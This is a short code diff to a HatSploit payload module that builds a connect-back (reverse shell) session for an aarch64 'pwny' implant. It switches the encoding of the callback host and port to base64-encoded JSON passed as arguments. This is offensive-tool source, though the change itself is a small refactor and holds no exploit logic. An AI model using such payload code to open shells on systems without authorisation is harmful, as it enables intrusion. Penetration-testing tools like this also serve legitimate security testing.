@@ -5,6 +5,8 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
+import json
+
 from hatsploit.lib.payload import Payload
 from hatsploit.lib.config import Config
 
@@ -51,22 +53,18 @@ class HatSploitPayload(Payload, StringTools):
 
     payload = {
         'Session': HatSploitSession,
-        'Args': "{} {}"
+        'Args': ""
     }
 
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        connback_data = str({
+        connback_data = json.dumps({
             'host': connback_host,
             'port': connback_port
         })
 
-        self.payload.update({
-            'Args': self.payload['Args'].format(
-                self.base64_string(connback_data)
-            )
-        })
+        self.payload['Args'] = self.base64_string(connback_data)
 
         return open(
             self.config.path_config['data_path'] + 'pwny/pwny.aarch64', 'rb'
